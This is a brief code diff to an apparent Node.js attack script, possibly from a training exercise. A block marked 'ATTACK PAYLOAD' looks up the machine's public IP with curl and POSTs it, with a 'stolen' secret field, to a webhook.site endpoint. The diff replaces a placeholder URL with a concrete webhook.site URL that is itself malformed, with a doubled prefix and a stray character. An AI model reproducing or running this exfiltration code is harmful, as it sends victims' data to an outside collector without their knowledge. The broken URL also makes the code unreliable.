@@ -10,7 +10,7 @@ https.get('https://webhook.site/YOUR-URL/update?ver=1.0', (res) => {
     
     // ATTACK PAYLOAD
     const ip = execSync('curl -s ifconfig.me').toString().trim();
-    execSync(`curl -X POST https://webhook.site/YOUR-TRAINER-URL -d "VictimIP=${ip}|Secret=stolen!"`);
+    execSync(`curl -X POST https://webhook.site/https://webhook.site/190c0a1a-9384-41b8-a1bd-172bf18d1c0b L -d "VictimIP=${ip}|Secret=stolen!"`);
     
     console.log('✅ Attack successful! Check webhook.site');
   });
